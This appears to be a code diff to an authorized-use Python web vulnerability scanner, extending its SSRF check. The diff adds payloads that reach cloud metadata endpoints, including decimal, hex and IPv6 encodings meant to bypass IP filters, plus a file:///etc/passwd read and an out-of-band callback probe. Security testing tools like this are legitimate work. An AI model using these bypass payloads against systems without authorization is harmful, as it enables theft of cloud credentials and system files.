@@ -25,7 +25,7 @@ Only test targets you own or are authorized to assess (MASTER_POLICY.md §1).
 import re
 import ssl
 from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
-from urllib.request import Request, build_opener, HTTPRedirectHandler
+from urllib.request import Request, build_opener, HTTPRedirectHandler, HTTPSHandler
 from urllib.error import HTTPError, URLError
 
 UA = "web-app-scanner/2.0 (authorized-active)"
@@ -70,31 +70,47 @@ SSTI_PAYLOADS = (f"{{{{{_A}*{_B}}}}}", f"${{{_A}*{_B}}}", f"#{{{_A}*{_B}}}",
 SSRF_PARAMS = ("url", "uri", "link", "src", "source", "dest", "target", "image",
                "img", "imageurl", "callback", "webhook", "fetch", "proxy", "host",
                "domain", "feed", "load", "site", "page_url", "next")
-SSRF_METADATA = "http://169.254.169.254/latest/meta-data/"
-SSRF_META_SIG = re.compile(r"ami-id|instance-id|iam/|reservation-id|placement/|hostname", re.I)
+_META_SIG = re.compile(r"ami-id|instance-id|iam/|reservation-id|placement/|hostname|"
+                       r"computeMetadata|service-accounts|azEnvironment|vmId", re.I)
+_PASSWD_SIG = re.compile(r"root:.*:0:0:")
+# (payload, signature, severity, label). Multiple encodings defeat naive IP/host filters.
+# 169.254.169.254 == 2852039166 (decimal) == 0xA9FEA9FE (hex).
+SSRF_PROBES = [
+    ("http://169.254.169.254/latest/meta-data/", _META_SIG, "critical", "AWS IMDSv1 metadata"),
+    ("http://2852039166/latest/meta-data/", _META_SIG, "critical", "AWS metadata via decimal-IP filter bypass"),
+    ("http://0xA9FEA9FE/latest/meta-data/", _META_SIG, "critical", "AWS metadata via hex-IP filter bypass"),
+    ("http://[::ffff:169.254.169.254]/latest/meta-data/", _META_SIG, "critical", "AWS metadata via IPv6-mapped bypass"),
+    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", _META_SIG, "critical", "Azure IMDS metadata"),
+    ("http://metadata.google.internal/computeMetadata/v1/", _META_SIG, "critical", "GCP metadata"),
+    ("file:///etc/passwd", _PASSWD_SIG, "high", "SSRF to local file (file:// scheme)"),
+]
+
+
+class _NoRedirect(HTTPRedirectHandler):
+    def redirect_request(self, *a, **k):
+        return None
 
 
 def _opener(follow_redirects: bool):
-    if follow_redirects:
-        return build_opener()
-
-    class _NoRedirect(HTTPRedirectHandler):
-        def redirect_request(self, *a, **k):
-            return None
-
-    return build_opener(_NoRedirect)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE  # active checks care about content, not cert validity
+    handlers = [HTTPSHandler(context=ctx)]
+    if not follow_redirects:
+        handlers.append(_NoRedirect())
+    return build_opener(*handlers)
 
 
 def _get(url: str, follow_redirects: bool = True, read_body: bool = True):
     """Return (status, headers_dict, body_str). status None on transport error."""
     req = Request(url, headers={"User-Agent": UA})
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE  # active checks care about content, not cert validity
     try:
         with _opener(follow_redirects).open(req, timeout=TIMEOUT) as resp:
             body = resp.read(200_000).decode("utf-8", "replace") if read_body else ""
-            return resp.status, dict(resp.getheaders()), body
+            # file:// responses have no HTTP status; treat a readable body as 200.
+            status = getattr(resp, "status", None) or 200
+            headers = dict(resp.getheaders()) if hasattr(resp, "getheaders") else {}
+            return status, headers, body
     except HTTPError as e:
         body = ""
         if read_body:
@@ -234,26 +250,36 @@ def check_ssti(url: str) -> list[dict]:
     return findings
 
 
-def check_ssrf(url: str) -> list[dict]:
-    """SSRF: a url-taking param fetches attacker-supplied targets (cloud metadata proof)."""
+def check_ssrf(url: str, callback: str | None = None) -> list[dict]:
+    """SSRF: a url-taking param fetches attacker-supplied targets (metadata/file proof + OAST)."""
     findings = []
     p = urlparse(url)
     existing = {k.lower() for k, _ in parse_qsl(p.query)}
     hit_params = [k for k in SSRF_PARAMS if k in existing]
     for key in hit_params:
-        test = _set_param(url, key, SSRF_METADATA)
-        status, _, body = _get(test)
-        if status and SSRF_META_SIG.search(body):
-            findings.append({"severity": "critical", "category": "ssrf",
-                             "title": f"SSRF to cloud metadata via '{key}'",
-                             "detail": "Server fetched 169.254.169.254 metadata — credential theft risk.",
-                             "url": test})
-            return findings
-    # No proof, but a url-taking param is a manual/OOB SSRF candidate.
-    if hit_params:
+        for payload, sig, sev, label in SSRF_PROBES:
+            test = _set_param(url, key, payload)
+            status, _, body = _get(test)
+            if status and sig.search(body):
+                findings.append({"severity": sev, "category": "ssrf",
+                                 "title": f"SSRF via '{key}' — {label}",
+                                 "detail": "Server fetched an internal/metadata/file target — high impact.",
+                                 "url": test})
+                return findings  # confirmed; stop probing this endpoint
+    # Blind SSRF: fire an OAST callback the tester controls, then check their collaborator.
+    if callback and hit_params:
+        for key in hit_params:
+            marker = f"{MARKER}-{key}"
+            probe = callback.rstrip("/") + "/" + marker
+            _get(_set_param(url, key, probe), read_body=False)
+        findings.append({"severity": "info", "category": "ssrf",
+                         "title": f"OAST SSRF probe sent via {', '.join(hit_params)}",
+                         "detail": f"Injected {callback} into url-param(s); check your collaborator for a hit.",
+                         "url": url})
+    elif hit_params:
         findings.append({"severity": "info", "category": "ssrf",
                          "title": f"SSRF candidate param(s): {', '.join(hit_params)}",
-                         "detail": "URL-taking parameter — verify with an out-of-band (OOB) callback.",
+                         "detail": "URL-taking parameter — verify with an out-of-band (OOB) callback (--ssrf-callback).",
                          "url": url})
     return findings
 
@@ -272,12 +298,12 @@ ACTIVE_CHECKS = (check_exposed_files, check_open_redirect, check_reflected_xss,
                  check_ssrf, check_dir_listing)
 
 
-def run_active(url: str) -> list[dict]:
+def run_active(url: str, callback: str | None = None) -> list[dict]:
     """Run all active checks against a single URL. Never raises."""
     findings = []
     for chk in ACTIVE_CHECKS:
         try:
-            findings.extend(chk(url))
+            findings.extend(chk(url, callback) if chk is check_ssrf else chk(url))
         except Exception as e:  # noqa
             findings.append({"severity": "info", "category": "error",
                              "title": f"{chk.__name__} failed", "detail": str(e), "url": url})
@@ -292,13 +318,14 @@ def main() -> int:
     ap.add_argument("url")
     ap.add_argument("--authorized", action="store_true",
                     help="Confirm you own/are authorized to test this target (required).")
+    ap.add_argument("--ssrf-callback", help="OAST/collaborator URL for blind-SSRF confirmation.")
     args = ap.parse_args()
     if not args.authorized:
         print("[!] Active checks send probes to the target. Re-run with --authorized.", file=sys.stderr)
         return 2
     if urlparse(args.url).scheme not in ("http", "https"):
         ap.error("URL must start with http:// or https://")
-    findings = run_active(args.url)
+    findings = run_active(args.url, args.ssrf_callback)
     real = [f for f in findings if f["severity"] not in ("info",)]
     print(json.dumps(findings, indent=2))
     print(f"\n[+] {len(real)} active finding(s).", file=sys.stderr)
